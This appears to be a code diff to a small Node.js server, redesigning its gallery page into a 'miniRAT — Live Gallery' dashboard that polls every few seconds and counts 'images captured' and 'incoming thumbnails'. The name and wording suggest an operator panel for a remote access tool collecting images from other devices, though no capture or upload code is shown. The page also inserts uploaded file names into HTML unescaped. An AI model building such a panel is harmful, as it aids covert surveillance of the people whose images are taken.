@@ -132,65 +132,142 @@ app.get('/api/fullsize/:filename', (req, res) => {
 
 // Serve the gallery interface
 app.get('/', (req, res) => {
-    res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Gallery Viewer</title>
-            <style>
-                body { font-family: Arial, sans-serif; margin: 20px; }
-                .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
-                .thumbnail { border: 1px solid #ddd; border-radius: 5px; overflow: hidden; }
-                .thumbnail img { width: 100%; height: auto; display: block; }
-                .filename { font-size: 12px; text-align: center; padding: 5px; }
-                .loading { text-align: center; padding: 20px; }
-                .error { color: red; text-align: center; }
-            </style>
-        </head>
-        <body>
-            <h1>Gallery Viewer</h1>
-            <div id="gallery" class="gallery">
-                <div class="loading">Loading thumbnails...</div>
-            </div>
+    res.send(`<!DOCTYPE html>
+<html>
+<head>
+    <title>miniRAT — Live Gallery</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0a0a0a; color: #e0e0e0;
+            min-height: 100vh;
+        }
+        .header {
+            padding: 20px 30px;
+            border-bottom: 1px solid #222;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .header h1 { font-size: 20px; font-weight: 600; }
+        .header h1 span { color: #666; font-weight: 400; }
+        .status {
+            display: flex; align-items: center; gap: 8px;
+            font-size: 13px; color: #888;
+        }
+        .live-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: #22c55e;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .stats {
+            padding: 12px 30px;
+            font-size: 13px; color: #666;
+            border-bottom: 1px solid #1a1a1a;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 4px; padding: 4px;
+        }
+        .thumb {
+            position: relative; aspect-ratio: 1;
+            overflow: hidden; cursor: pointer;
+            animation: fadeIn 0.4s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .thumb img {
+            width: 100%; height: 100%;
+            object-fit: cover; display: block;
+            transition: transform 0.2s;
+        }
+        .thumb:hover img { transform: scale(1.05); }
+        .thumb .info {
+            position: absolute; bottom: 0; left: 0; right: 0;
+            padding: 20px 8px 6px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            font-size: 11px; opacity: 0;
+            transition: opacity 0.2s;
+        }
+        .thumb:hover .info { opacity: 1; }
+        .empty {
+            grid-column: 1 / -1;
+            text-align: center; padding: 80px 20px;
+            color: #444; font-size: 15px;
+        }
+        .empty .icon { font-size: 48px; margin-bottom: 12px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>miniRAT <span>Gallery</span></h1>
+        <div class="status">
+            <div class="live-dot"></div>
+            <span>Live — refreshing every 3s</span>
+        </div>
+    </div>
+    <div class="stats" id="stats">Loading...</div>
+    <div id="gallery" class="gallery"></div>
 
-            <script>
-                async function loadThumbnails() {
-                    try {
-                        const response = await fetch('/api/thumbnails');
-                        const data = await response.json();
+    <script>
+        let lastCount = 0;
 
-                        const gallery = document.getElementById('gallery');
+        async function loadThumbnails() {
+            try {
+                const response = await fetch('/api/thumbnails');
+                const data = await response.json();
+                const gallery = document.getElementById('gallery');
+                const stats = document.getElementById('stats');
+
+                if (data.thumbnails && data.thumbnails.length > 0) {
+                    const count = data.thumbnails.length;
+                    const latest = data.thumbnails[0];
+                    const latestTime = latest.uploadedAt
+                        ? new Date(latest.uploadedAt).toLocaleString()
+                        : 'unknown';
+
+                    stats.textContent = count + ' images captured — latest: ' + latestTime;
+
+                    // Only rebuild DOM if count changed
+                    if (count !== lastCount) {
                         gallery.innerHTML = '';
-
-                        if (data.thumbnails && data.thumbnails.length > 0) {
-                            data.thumbnails.forEach(thumb => {
-                                const div = document.createElement('div');
-                                div.className = 'thumbnail';
-                                div.innerHTML = \`
-                                    <img src="/uploads/\${thumb.thumbnail}" alt="\${thumb.name}">
-                                    <div class="filename">\${thumb.name.substring(0, 20)}...</div>
-                                \`;
-                                gallery.appendChild(div);
-                            });
-                        } else {
-                            gallery.innerHTML = '<div class="error">No thumbnails found</div>';
-                        }
-                    } catch (error) {
-                        console.error('Error loading thumbnails:', error);
-                        document.getElementById('gallery').innerHTML =
-                            '<div class="error">Failed to load thumbnails</div>';
+                        data.thumbnails.forEach(function(thumb) {
+                            const div = document.createElement('div');
+                            div.className = 'thumb';
+                            const time = thumb.uploadedAt
+                                ? new Date(thumb.uploadedAt).toLocaleTimeString()
+                                : '';
+                            div.innerHTML =
+                                '<img src="/uploads/' + thumb.thumbnail + '" alt="' + thumb.name + '">' +
+                                '<div class="info">' + thumb.name.substring(0, 24) + '<br>' + time + '</div>';
+                            gallery.appendChild(div);
+                        });
+                        lastCount = count;
                     }
+                } else {
+                    stats.textContent = '0 images — waiting for uploads...';
+                    gallery.innerHTML =
+                        '<div class="empty">' +
+                        '<div class="icon">📡</div>' +
+                        'Waiting for incoming thumbnails...' +
+                        '</div>';
                 }
+            } catch (error) {
+                document.getElementById('stats').textContent = 'Connection error — retrying...';
+            }
+        }
 
-                // Load thumbnails when page loads
-                loadThumbnails();
-
-                // Refresh every 30 seconds
-                setInterval(loadThumbnails, 30000);
-            </script>
-        </body>
-        </html>
-    `);
+        loadThumbnails();
+        setInterval(loadThumbnails, 3000);
+    </script>
+</body>
+</html>`);
 });
 
 app.listen(port, '0.0.0.0', () => {
